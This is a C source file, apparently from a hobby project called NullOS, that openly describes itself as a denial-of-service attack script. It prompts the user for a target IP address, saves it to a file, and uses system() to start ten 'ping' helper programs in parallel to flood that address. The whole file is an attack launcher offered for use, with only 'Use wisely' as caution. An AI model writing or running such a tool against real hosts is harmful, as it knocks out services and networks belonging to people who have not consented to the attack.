/////////////////////////////////
//                             //
//  This is DoS attack script  //
//  Use wisely                 //
//                             //
/////////////////////////////////


/////////////////////////////////
//  This includes the modules  //
/////////////////////////////////
#include <stdio.h>
#include <stdlib.h>

/////////////////////////////////
//  This starts the main loop  //
/////////////////////////////////
int main() {

    ////////////////////////////////
    //  This stes some variables  //
    ////////////////////////////////
    char ip[150];
    char filepath[1024];
    char command[2048];

    //////////////////////////////////////////////
    //  This gets the ~ folder name if posible  //
    //////////////////////////////////////////////
    char *home = getenv("HOME");
    if (!home) {
        fprintf(stderr, "Error: HOME environment variable not set\n");
        return 1;
    }

    ////////////////////////////////////
    //  This creates the path with ~  //
    ////////////////////////////////////
    snprintf(filepath, sizeof(filepath), "%s/Documents/NullOS/Null/c/ip.txt", home);

    /////////////////////////////////////////////////////////////////////
    //  This asks user for IP he wanna DoS and puts it in variable ip  //
    /////////////////////////////////////////////////////////////////////
    printf("\nWhat IP you wanna DoS\n>> ");
    scanf("%149s", ip);

    ///////////////////////////////////////////////////////////
    //  This ones file in the path (variablr name filepath)  //
    //  in write mode and wirtes the ip user wants to Dos    //
    ///////////////////////////////////////////////////////////
    FILE *f = fopen(filepath, "w");
    if (!f) {
        perror("fopen");
        return 1;
    }
    fprintf(f, "%s\n", ip);
    fclose(f);

    //////////////////////////////////////////////////////////
    //  This creates string that paraler rnus 10 programms  //
    //////////////////////////////////////////////////////////
    snprintf(command, sizeof(command),
             "%s/Documents/NullOS/Null/c/dos/ping1 & "
             "%s/Documents/NullOS/Null/c/dos/ping2 & "
             "%s/Documents/NullOS/Null/c/dos/ping3 & "
             "%s/Documents/NullOS/Null/c/dos/ping4 & "
             "%s/Documents/NullOS/Null/c/dos/ping5 & "
             "%s/Documents/NullOS/Null/c/dos/ping6 & "
             "%s/Documents/NullOS/Null/c/dos/ping7 & "
             "%s/Documents/NullOS/Null/c/dos/ping8 & "
             "%s/Documents/NullOS/Null/c/dos/ping9 & "
             "%s/Documents/NullOS/Null/c/dos/ping10",
             home, home, home, home, home,
             home, home, home, home, home
    );

    ///////////////////////////////////////////////////////
    //  This tells user how to stop attack and executes  //
    //  the string we declared above                     //
    ///////////////////////////////////////////////////////
    printf("If you want to stop this, press CTRL+C.\n");
    printf("Starting DoS...\n");
    system(command);

    //////////////////////////////////////////////////////////////
    //  This is basic return 0 withou error when programm ends  //
    //////////////////////////////////////////////////////////////
    return 0;
}
